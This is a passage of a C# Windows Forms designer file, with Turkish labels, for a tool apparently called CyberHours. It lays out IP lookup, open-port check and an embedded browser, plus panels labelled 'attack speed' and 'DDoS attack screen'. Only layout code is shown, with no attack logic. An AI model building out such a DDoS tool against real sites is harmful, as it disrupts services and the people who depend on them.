            this.iTalk_TextBox_Small3.Location = new System.Drawing.Point(75, 41);
            this.iTalk_TextBox_Small3.MaxLength = 32767;
            this.iTalk_TextBox_Small3.Multiline = false;
            this.iTalk_TextBox_Small3.Name = "iTalk_TextBox_Small3";
            this.iTalk_TextBox_Small3.ReadOnly = false;
            this.iTalk_TextBox_Small3.Size = new System.Drawing.Size(311, 28);
            this.iTalk_TextBox_Small3.TabIndex = 10;
            this.iTalk_TextBox_Small3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.iTalk_TextBox_Small3.UseSystemPasswordChar = false;
            // 
            // label48
            // 
            this.label48.AutoSize = true;
            this.label48.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label48.Location = new System.Drawing.Point(8, 101);
            this.label48.Name = "label48";
            this.label48.Size = new System.Drawing.Size(91, 13);
            this.label48.TabIndex = 9;
            this.label48.Text = "Saldırı Hızı :";
            // 
            // label47
            // 
            this.label47.AutoSize = true;
            this.label47.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label47.Location = new System.Drawing.Point(8, 49);
            this.label47.Name = "label47";
            this.label47.Size = new System.Drawing.Size(61, 13);
            this.label47.TabIndex = 7;
            this.label47.Text = "Ip & Url :";
            // 
            // iTalk_GroupBox12
            // 
            this.iTalk_GroupBox12.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox12.Controls.Add(this.recuperareIIButton15);
            this.iTalk_GroupBox12.Controls.Add(this.sorgula);
            this.iTalk_GroupBox12.Controls.Add(this.label36);
            this.iTalk_GroupBox12.Controls.Add(this.txtport);
            this.iTalk_GroupBox12.Controls.Add(this.label34);
            this.iTalk_GroupBox12.Controls.Add(this.txtıp);
            this.iTalk_GroupBox12.Controls.Add(this.label35);
            this.iTalk_GroupBox12.Location = new System.Drawing.Point(22, 225);
            this.iTalk_GroupBox12.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox12.Name = "iTalk_GroupBox12";
            this.iTalk_GroupBox12.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox12.Size = new System.Drawing.Size(318, 246);
            this.iTalk_GroupBox12.TabIndex = 14;
            this.iTalk_GroupBox12.Text = "Açık Port Kontrol";
            // 
            // recuperareIIButton15
            // 
            this.recuperareIIButton15.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton15.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton15.Location = new System.Drawing.Point(173, 158);
            this.recuperareIIButton15.Name = "recuperareIIButton15";
            this.recuperareIIButton15.Size = new System.Drawing.Size(134, 30);
            this.recuperareIIButton15.TabIndex = 26;
            this.recuperareIIButton15.Text = "TEMİZLE";
            this.recuperareIIButton15.Click += new System.EventHandler(this.RecuperareIIButton15_Click);
            // 
            // sorgula
            // 
            this.sorgula.BackColor = System.Drawing.Color.Transparent;
            this.sorgula.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.sorgula.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.sorgula.Location = new System.Drawing.Point(12, 158);
            this.sorgula.Name = "sorgula";
            this.sorgula.Size = new System.Drawing.Size(134, 30);
            this.sorgula.TabIndex = 25;
            this.sorgula.Text = "SORGULA";
            this.sorgula.Click += new System.EventHandler(this.Sorgula_Click);
            // 
            // label36
            // 
            this.label36.AutoSize = true;
            this.label36.BackColor = System.Drawing.Color.White;
            this.label36.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label36.Location = new System.Drawing.Point(24, 206);
            this.label36.Name = "label36";
            this.label36.Size = new System.Drawing.Size(64, 17);
            this.label36.TabIndex = 10;
            this.label36.Text = "Bekleniyor";
            // 
            // txtport
            // 
            this.txtport.BackColor = System.Drawing.Color.Transparent;
            this.txtport.Font = new System.Drawing.Font("Tahoma", 11F);
            this.txtport.ForeColor = System.Drawing.Color.Black;
            this.txtport.Location = new System.Drawing.Point(104, 101);
            this.txtport.MaxLength = 32767;
            this.txtport.Multiline = false;
            this.txtport.Name = "txtport";
            this.txtport.ReadOnly = false;
            this.txtport.Size = new System.Drawing.Size(204, 28);
            this.txtport.TabIndex = 8;
            this.txtport.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtport.UseSystemPasswordChar = false;
            // 
            // label34
            // 
            this.label34.AutoSize = true;
            this.label34.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label34.Location = new System.Drawing.Point(9, 107);
            this.label34.Name = "label34";
            this.label34.Size = new System.Drawing.Size(98, 14);
            this.label34.TabIndex = 7;
            this.label34.Text = "Port Yazınız:";
            // 
            // txtıp
            // 
            this.txtıp.BackColor = System.Drawing.Color.Transparent;
            this.txtıp.Font = new System.Drawing.Font("Tahoma", 11F);
            this.txtıp.ForeColor = System.Drawing.Color.Black;
            this.txtıp.Location = new System.Drawing.Point(108, 49);
            this.txtıp.MaxLength = 32767;
            this.txtıp.Multiline = false;
            this.txtıp.Name = "txtıp";
            this.txtıp.ReadOnly = false;
            this.txtıp.Size = new System.Drawing.Size(200, 28);
            this.txtıp.TabIndex = 6;
            this.txtıp.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtıp.UseSystemPasswordChar = false;
            // 
            // label35
            // 
            this.label35.AutoSize = true;
            this.label35.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label35.Location = new System.Drawing.Point(37, 55);
            this.label35.Name = "label35";
            this.label35.Size = new System.Drawing.Size(70, 14);
            this.label35.TabIndex = 5;
            this.label35.Text = "Site Ip :";
            // 
            // iTalk_GroupBox14
            // 
            this.iTalk_GroupBox14.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox14.Controls.Add(this.recuperareIIButton13);
            this.iTalk_GroupBox14.Controls.Add(this.iTalk_Button_213);
            this.iTalk_GroupBox14.Controls.Add(this.label46);
            this.iTalk_GroupBox14.Controls.Add(this.label45);
            this.iTalk_GroupBox14.Controls.Add(this.label44);
            this.iTalk_GroupBox14.Controls.Add(this.label37);
            this.iTalk_GroupBox14.Location = new System.Drawing.Point(352, 41);
            this.iTalk_GroupBox14.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox14.Name = "iTalk_GroupBox14";
            this.iTalk_GroupBox14.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox14.Size = new System.Drawing.Size(395, 169);
            this.iTalk_GroupBox14.TabIndex = 13;
            this.iTalk_GroupBox14.Text = "Kendi Ip Adresiniz";
            // 
            // recuperareIIButton13
            // 
            this.recuperareIIButton13.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton13.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton13.Location = new System.Drawing.Point(207, 127);
            this.recuperareIIButton13.Name = "recuperareIIButton13";
            this.recuperareIIButton13.Size = new System.Drawing.Size(178, 30);
            this.recuperareIIButton13.TabIndex = 23;
            this.recuperareIIButton13.Text = "TEMİZLE";
            this.recuperareIIButton13.Click += new System.EventHandler(this.RecuperareIIButton13_Click);
            // 
            // iTalk_Button_213
            // 
            this.iTalk_Button_213.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_213.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.iTalk_Button_213.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.iTalk_Button_213.Location = new System.Drawing.Point(11, 127);
            this.iTalk_Button_213.Name = "iTalk_Button_213";
            this.iTalk_Button_213.Size = new System.Drawing.Size(178, 30);
            this.iTalk_Button_213.TabIndex = 22;
            this.iTalk_Button_213.Text = "ÖĞREN";
            this.iTalk_Button_213.Click += new System.EventHandler(this.İTalk_Button_213_Click);
            // 
            // label46
            // 
            this.label46.AutoSize = true;
            this.label46.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label46.Location = new System.Drawing.Point(119, 83);
            this.label46.Name = "label46";
            this.label46.Size = new System.Drawing.Size(56, 14);
            this.label46.TabIndex = 5;
            this.label46.Text = "Pc Ip :";
            // 
            // label45
            // 
            this.label45.AutoSize = true;
            this.label45.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label45.Location = new System.Drawing.Point(105, 45);
            this.label45.Name = "label45";
            this.label45.Size = new System.Drawing.Size(70, 14);
            this.label45.TabIndex = 4;
            this.label45.Text = "Pc İsmi :";
            // 
            // label44
            // 
            this.label44.AutoSize = true;
            this.label44.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label44.Location = new System.Drawing.Point(8, 83);
            this.label44.Name = "label44";
            this.label44.Size = new System.Drawing.Size(105, 14);
            this.label44.TabIndex = 2;
            this.label44.Text = "Ip Adresiniz :";
            // 
            // label37
            // 
            this.label37.AutoSize = true;
            this.label37.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label37.Location = new System.Drawing.Point(8, 45);
            this.label37.Name = "label37";
            this.label37.Size = new System.Drawing.Size(91, 14);
            this.label37.TabIndex = 1;
            this.label37.Text = "Bilgisayar :";
            // 
            // iTalk_GroupBox13
            // 
            this.iTalk_GroupBox13.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox13.Controls.Add(this.recuperareIIButton14);
            this.iTalk_GroupBox13.Controls.Add(this.ıpbul);
            this.iTalk_GroupBox13.Controls.Add(this.ıp);
            this.iTalk_GroupBox13.Controls.Add(this.label33);
            this.iTalk_GroupBox13.Controls.Add(this.url);
            this.iTalk_GroupBox13.Controls.Add(this.label32);
            this.iTalk_GroupBox13.Location = new System.Drawing.Point(22, 41);
            this.iTalk_GroupBox13.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox13.Name = "iTalk_GroupBox13";
            this.iTalk_GroupBox13.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox13.Size = new System.Drawing.Size(318, 169);
            this.iTalk_GroupBox13.TabIndex = 12;
            this.iTalk_GroupBox13.Text = "Site Ip Öğrenme";
            // 
            // recuperareIIButton14
            // 
            this.recuperareIIButton14.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton14.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton14.Location = new System.Drawing.Point(163, 127);
            this.recuperareIIButton14.Name = "recuperareIIButton14";
            this.recuperareIIButton14.Size = new System.Drawing.Size(144, 30);
            this.recuperareIIButton14.TabIndex = 25;
            this.recuperareIIButton14.Text = "TEMİZLE";
            this.recuperareIIButton14.Click += new System.EventHandler(this.RecuperareIIButton14_Click);
            // 
            // ıpbul
            // 
            this.ıpbul.BackColor = System.Drawing.Color.Transparent;
            this.ıpbul.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.ıpbul.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.ıpbul.Location = new System.Drawing.Point(12, 127);
            this.ıpbul.Name = "ıpbul";
            this.ıpbul.Size = new System.Drawing.Size(144, 30);
            this.ıpbul.TabIndex = 24;
            this.ıpbul.Text = "IP BUL";
            this.ıpbul.Click += new System.EventHandler(this.Ipbul_Click);
            // 
            // ıp
            // 
            this.ıp.BackColor = System.Drawing.Color.Transparent;
            this.ıp.Font = new System.Drawing.Font("Tahoma", 11F);
            this.ıp.ForeColor = System.Drawing.Color.Black;
            this.ıp.Location = new System.Drawing.Point(104, 83);
            this.ıp.MaxLength = 32767;
            this.ıp.Multiline = false;
            this.ıp.Name = "ıp";
            this.ıp.ReadOnly = false;
            this.ıp.Size = new System.Drawing.Size(204, 28);
            this.ıp.TabIndex = 3;
            this.ıp.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.ıp.UseSystemPasswordChar = false;
            // 
            // label33
            // 
            this.label33.AutoSize = true;
            this.label33.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label33.Location = new System.Drawing.Point(25, 89);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(84, 14);
            this.label33.TabIndex = 2;
            this.label33.Text = "Ip Adresi :";
            // 
            // url
            // 
            this.url.BackColor = System.Drawing.Color.Transparent;
            this.url.Font = new System.Drawing.Font("Tahoma", 11F);
            this.url.ForeColor = System.Drawing.Color.Black;
            this.url.Location = new System.Drawing.Point(108, 31);
            this.url.MaxLength = 32767;
            this.url.Multiline = false;
            this.url.Name = "url";
            this.url.ReadOnly = false;
            this.url.Size = new System.Drawing.Size(200, 28);
            this.url.TabIndex = 1;
            this.url.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.url.UseSystemPasswordChar = false;
            // 
            // label32
            // 
            this.label32.AutoSize = true;
            this.label32.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label32.Location = new System.Drawing.Point(25, 37);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(77, 14);
            this.label32.TabIndex = 0;
            this.label32.Text = "Site Url :";
            // 
            // panel20
            // 
            this.panel20.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel20.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel20.Location = new System.Drawing.Point(10, 57);
            this.panel20.Name = "panel20";
            this.panel20.Size = new System.Drawing.Size(64, 10);
            this.panel20.TabIndex = 6;
            // 
            // panel19
            // 
            this.panel19.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel19.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel19.Location = new System.Drawing.Point(74, 36);
            this.panel19.Name = "panel19";
            this.panel19.Size = new System.Drawing.Size(10, 31);
            this.panel19.TabIndex = 5;
            // 
            // panel18
            // 
            this.panel18.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel18.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel18.Location = new System.Drawing.Point(0, 36);
            this.panel18.Name = "panel18";
            this.panel18.Size = new System.Drawing.Size(10, 31);
            this.panel18.TabIndex = 4;
            // 
            // panel17
            // 
            this.panel17.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel17.Controls.Add(this.label25);
            this.panel17.Controls.Add(this.button3);
            this.panel17.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel17.Location = new System.Drawing.Point(0, 0);
            this.panel17.Name = "panel17";
            this.panel17.Size = new System.Drawing.Size(84, 36);
            this.panel17.TabIndex = 2;
            this.panel17.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel17_MouseDown);
            this.panel17.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel17_MouseMove);
            this.panel17.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel17_MouseUp);
            // 
            // label25
            // 
            this.label25.AutoSize = true;
            this.label25.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label25.ForeColor = System.Drawing.Color.White;
            this.label25.Location = new System.Drawing.Point(325, 10);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(126, 17);
            this.label25.TabIndex = 12;
            this.label25.Text = "< Ip Port Kontrol >";
            // 
            // button3
            // 
            this.button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.ForeColor = System.Drawing.Color.White;
            this.button3.Location = new System.Drawing.Point(731, 7);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(23, 22);
            this.button3.TabIndex = 4;
            this.button3.Text = "X";
            this.button3.UseVisualStyleBackColor = false;
            this.button3.Click += new System.EventHandler(this.Button3_Click);
            // 
            // timer9
            // 
            this.timer9.Tick += new System.EventHandler(this.Timer9_Tick);
            // 
            // timer10
            // 
            this.timer10.Interval = 2000;
            this.timer10.Tick += new System.EventHandler(this.Timer10_Tick);
            // 
            // panel21
            // 
            this.panel21.Controls.Add(this.webBrowser3);
            this.panel21.Controls.Add(this.panel24);
            this.panel21.Controls.Add(this.panel23);
            this.panel21.Controls.Add(this.panel25);
            this.panel21.Controls.Add(this.panel22);
            this.panel21.Location = new System.Drawing.Point(801, 229);
            this.panel21.Name = "panel21";
            this.panel21.Size = new System.Drawing.Size(102, 69);
            this.panel21.TabIndex = 23;
            // 
            // webBrowser3
            // 
            this.webBrowser3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.webBrowser3.Location = new System.Drawing.Point(6, 36);
            this.webBrowser3.MinimumSize = new System.Drawing.Size(20, 20);
            this.webBrowser3.Name = "webBrowser3";
            this.webBrowser3.ScriptErrorsSuppressed = true;
            this.webBrowser3.Size = new System.Drawing.Size(90, 23);
            this.webBrowser3.TabIndex = 8;
            this.webBrowser3.Url = new System.Uri("http://www.google.com", System.UriKind.Absolute);
            // 
            // panel24
            // 
            this.panel24.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel24.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel24.Location = new System.Drawing.Point(96, 36);
            this.panel24.Name = "panel24";
            this.panel24.Size = new System.Drawing.Size(6, 23);
            this.panel24.TabIndex = 6;
            // 
            // panel23
            // 
            this.panel23.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel23.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel23.Location = new System.Drawing.Point(0, 36);
            this.panel23.Name = "panel23";
            this.panel23.Size = new System.Drawing.Size(6, 23);
            this.panel23.TabIndex = 5;
            // 
            // panel25
            // 
            this.panel25.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel25.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel25.Location = new System.Drawing.Point(0, 59);
            this.panel25.Name = "panel25";
            this.panel25.Size = new System.Drawing.Size(102, 10);
            this.panel25.TabIndex = 7;
            // 
            // panel22
            // 
            this.panel22.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel22.Controls.Add(this.ambiance_Button_25);
            this.panel22.Controls.Add(this.ambiance_Button_24);
            this.panel22.Controls.Add(this.ambiance_Button_23);
            this.panel22.Controls.Add(this.pictureBox14);
            this.panel22.Controls.Add(this.label26);
            this.panel22.Controls.Add(this.pictureBox13);
            this.panel22.Controls.Add(this.pictureBox12);
            this.panel22.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel22.Location = new System.Drawing.Point(0, 0);
            this.panel22.Name = "panel22";
            this.panel22.Size = new System.Drawing.Size(102, 36);
            this.panel22.TabIndex = 3;
            this.panel22.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel22_MouseDown);
            this.panel22.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel22_MouseMove);
            this.panel22.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel22_MouseUp);
            // 
            // ambiance_Button_25
            // 
            this.ambiance_Button_25.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.ambiance_Button_25.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_Button_25.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_Button_25.Image = null;
            this.ambiance_Button_25.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ambiance_Button_25.Location = new System.Drawing.Point(40, 6);
            this.ambiance_Button_25.Name = "ambiance_Button_25";
            this.ambiance_Button_25.Size = new System.Drawing.Size(26, 24);
            this.ambiance_Button_25.TabIndex = 28;
            this.ambiance_Button_25.Text = "] [";
            this.ambiance_Button_25.TextAlignment = System.Drawing.StringAlignment.Center;
            this.ambiance_Button_25.Click += new System.EventHandler(this.Ambiance_Button_25_Click);
            // 
            // ambiance_Button_24
            // 
            this.ambiance_Button_24.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.ambiance_Button_24.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_Button_24.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_Button_24.Image = null;
            this.ambiance_Button_24.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ambiance_Button_24.Location = new System.Drawing.Point(69, 6);
            this.ambiance_Button_24.Name = "ambiance_Button_24";
            this.ambiance_Button_24.Size = new System.Drawing.Size(26, 24);
            this.ambiance_Button_24.TabIndex = 27;
            this.ambiance_Button_24.Text = "X";
            this.ambiance_Button_24.TextAlignment = System.Drawing.StringAlignment.Center;
            this.ambiance_Button_24.Click += new System.EventHandler(this.Ambiance_Button_24_Click);
            // 
            // ambiance_Button_23
            // 
            this.ambiance_Button_23.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.ambiance_Button_23.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_Button_23.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_Button_23.Image = null;
            this.ambiance_Button_23.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ambiance_Button_23.Location = new System.Drawing.Point(40, 6);
            this.ambiance_Button_23.Name = "ambiance_Button_23";
            this.ambiance_Button_23.Size = new System.Drawing.Size(26, 24);
            this.ambiance_Button_23.TabIndex = 9;
            this.ambiance_Button_23.Text = "[ ]";
            this.ambiance_Button_23.TextAlignment = System.Drawing.StringAlignment.Center;
            this.ambiance_Button_23.Click += new System.EventHandler(this.Ambiance_Button_23_Click);
            // 
            // pictureBox14
            // 
            this.pictureBox14.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox14.Image")));
            this.pictureBox14.Location = new System.Drawing.Point(95, 3);
            this.pictureBox14.Name = "pictureBox14";
            this.pictureBox14.Size = new System.Drawing.Size(29, 30);
            this.pictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox14.TabIndex = 26;
            this.pictureBox14.TabStop = false;
            this.pictureBox14.Click += new System.EventHandler(this.PictureBox14_Click);
            // 
            // label26
            // 
            this.label26.AutoSize = true;
            this.label26.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label26.ForeColor = System.Drawing.Color.White;
            this.label26.Location = new System.Drawing.Point(425, 10);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(134, 17);
            this.label26.TabIndex = 12;
            this.label26.Text = "CyberHours-Browser";
            // 
            // pictureBox13
            // 
            this.pictureBox13.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox13.Image")));
            this.pictureBox13.Location = new System.Drawing.Point(41, 3);
            this.pictureBox13.Name = "pictureBox13";
            this.pictureBox13.Size = new System.Drawing.Size(29, 30);
            this.pictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox13.TabIndex = 25;
            this.pictureBox13.TabStop = false;
            this.pictureBox13.Click += new System.EventHandler(this.PictureBox13_Click);
            // 
            // pictureBox12
            // 
            this.pictureBox12.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox12.Image")));
            this.pictureBox12.Location = new System.Drawing.Point(6, 3);
            this.pictureBox12.Name = "pictureBox12";
            this.pictureBox12.Size = new System.Drawing.Size(29, 30);
            this.pictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox12.TabIndex = 24;
            this.pictureBox12.TabStop = false;
            this.pictureBox12.Click += new System.EventHandler(this.PictureBox12_Click);
            // 
            // panel26
            // 
            this.panel26.BackColor = System.Drawing.Color.White;
            this.panel26.Controls.Add(this.iTalk_GroupBox2);
            this.panel26.Controls.Add(this.iTalk_GroupBox1);
            this.panel26.Controls.Add(this.panel30);
            this.panel26.Controls.Add(this.panel29);
            this.panel26.Controls.Add(this.panel28);
            this.panel26.Controls.Add(this.panel27);
            this.panel26.Location = new System.Drawing.Point(595, 326);
            this.panel26.Name = "panel26";
            this.panel26.Size = new System.Drawing.Size(83, 70);
            this.panel26.TabIndex = 24;
            // 
            // iTalk_GroupBox2
            // 
            this.iTalk_GroupBox2.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox2.Controls.Add(this.pictureBox16);
            this.iTalk_GroupBox2.Controls.Add(this.recuperareIIButton20);
            this.iTalk_GroupBox2.Controls.Add(this.recuperareIIButton19);
            this.iTalk_GroupBox2.Controls.Add(this.recuperareIIButton18);
            this.iTalk_GroupBox2.Controls.Add(this.recuperareIIButton21);
            this.iTalk_GroupBox2.Controls.Add(this.pictureBox15);
            this.iTalk_GroupBox2.Controls.Add(this.listBox6);
            this.iTalk_GroupBox2.Location = new System.Drawing.Point(16, 183);
            this.iTalk_GroupBox2.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox2.Name = "iTalk_GroupBox2";
            this.iTalk_GroupBox2.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox2.Size = new System.Drawing.Size(820, 325);
            this.iTalk_GroupBox2.TabIndex = 9;
            this.iTalk_GroupBox2.Text = "Ddos Saldırı Ekranı";
            // 
            // pictureBox16
            // 
            this.pictureBox16.BackColor = System.Drawing.Color.Black;
            this.pictureBox16.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox16.Image")));
            this.pictureBox16.Location = new System.Drawing.Point(705, 247);
            this.pictureBox16.Name = "pictureBox16";
            this.pictureBox16.Size = new System.Drawing.Size(72, 57);
            this.pictureBox16.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox16.TabIndex = 30;
            this.pictureBox16.TabStop = false;
            this.pictureBox16.Click += new System.EventHandler(this.PictureBox16_Click);
            // 
            // recuperareIIButton20
            // 
            this.recuperareIIButton20.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton20.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton20.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton20.Location = new System.Drawing.Point(653, 147);
            this.recuperareIIButton20.Name = "recuperareIIButton20";
            this.recuperareIIButton20.Size = new System.Drawing.Size(124, 24);
            this.recuperareIIButton20.TabIndex = 29;
            this.recuperareIIButton20.Text = "BEYAZ";
            this.recuperareIIButton20.Click += new System.EventHandler(this.RecuperareIIButton20_Click);
            // 
            // recuperareIIButton19
            // 
            this.recuperareIIButton19.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton19.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton19.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton19.Location = new System.Drawing.Point(653, 207);
            this.recuperareIIButton19.Name = "recuperareIIButton19";
            this.recuperareIIButton19.Size = new System.Drawing.Size(124, 24);
            this.recuperareIIButton19.TabIndex = 28;
            this.recuperareIIButton19.Text = "YEŞİL";
            this.recuperareIIButton19.Click += new System.EventHandler(this.RecuperareIIButton19_Click);
            // 
            // recuperareIIButton18
            // 
            this.recuperareIIButton18.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton18.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton18.Location = new System.Drawing.Point(653, 177);
            this.recuperareIIButton18.Name = "recuperareIIButton18";
            this.recuperareIIButton18.Size = new System.Drawing.Size(124, 24);
            this.recuperareIIButton18.TabIndex = 27;
            this.recuperareIIButton18.Text = "SARI ";
            this.recuperareIIButton18.Click += new System.EventHandler(this.RecuperareIIButton18_Click);
            // 
            // recuperareIIButton21
            // 
            this.recuperareIIButton21.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton21.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
